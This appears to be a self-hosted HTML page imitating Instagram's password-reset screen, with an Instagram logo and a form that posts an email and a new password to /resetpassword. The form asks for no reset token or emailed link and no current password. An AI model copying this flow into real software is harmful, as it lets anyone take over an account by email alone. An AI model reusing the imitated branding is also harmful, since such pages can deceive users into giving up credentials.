
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram | Reset Password</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            font-family: 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #0d0d0d, #1a1a1a);
            color: #e0e0e0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 0;
        }

        .form-container {
            background-color: #121212;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
            padding: 32px;
            width: 100%;
            max-width: 400px;
            text-align: center;
            position: relative;
        }

        .logo {
            margin-bottom: 24px;
        }

        .logo img {
            width: 100px;
            height: auto;
        }

        .form-title {
            font-size: 24px;
            font-weight: 700;
            color: #ffffff;
            margin-bottom: 24px;
        }

        .form-input {
            background-color: #1e1e1e;
            border: 1px solid #333333;
            border-radius: 8px;
            padding: 12px;
            width: 100%;
            margin-bottom: 16px;
            color: #e0e0e0;
            transition: border-color 0.3s ease;
        }

        .form-input:focus {
            outline: none;
            border-color:royalblue; /* Unique accent color for focus */
        }

        .form-input::placeholder {
            color: #888888;
        }

        .btn-submit {
            background-color: rgba(65, 105, 225, 0.706); /* Unique button color */
            color: #ffffff;
            border: none;
            border-radius: 8px;
            padding: 12px;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.3s ease;
            font-size: 16px;
            font-weight: 600;
            width: 100%;
            text-align: center;
        }

        .btn-submit:hover {
            background-color: royalblue; /* Slightly darker shade on hover */
            transform: scale(1.02);
        }

        @media (max-width: 768px) {
            .form-container {
                padding: 24px;
            }
        }
    </style>
</head>

<body>
    <div class="form-container">
        <div class="logo">
            <img src="/images/instalogo.png" alt="Instagram Logo">
        </div>
        <h1 class="form-title">Reset Your Password</h1>
        <form action="/resetpassword" method="post">
            <input type="email" name="email" id="email" class="form-input" placeholder="Enter your email" required>
            <input type="password" name="newPassword" id="password" class="form-input" placeholder="New password" required>
            <button type="submit" class="btn-submit">Save Password</button>
        </form>
    </div>
</body>

</html>
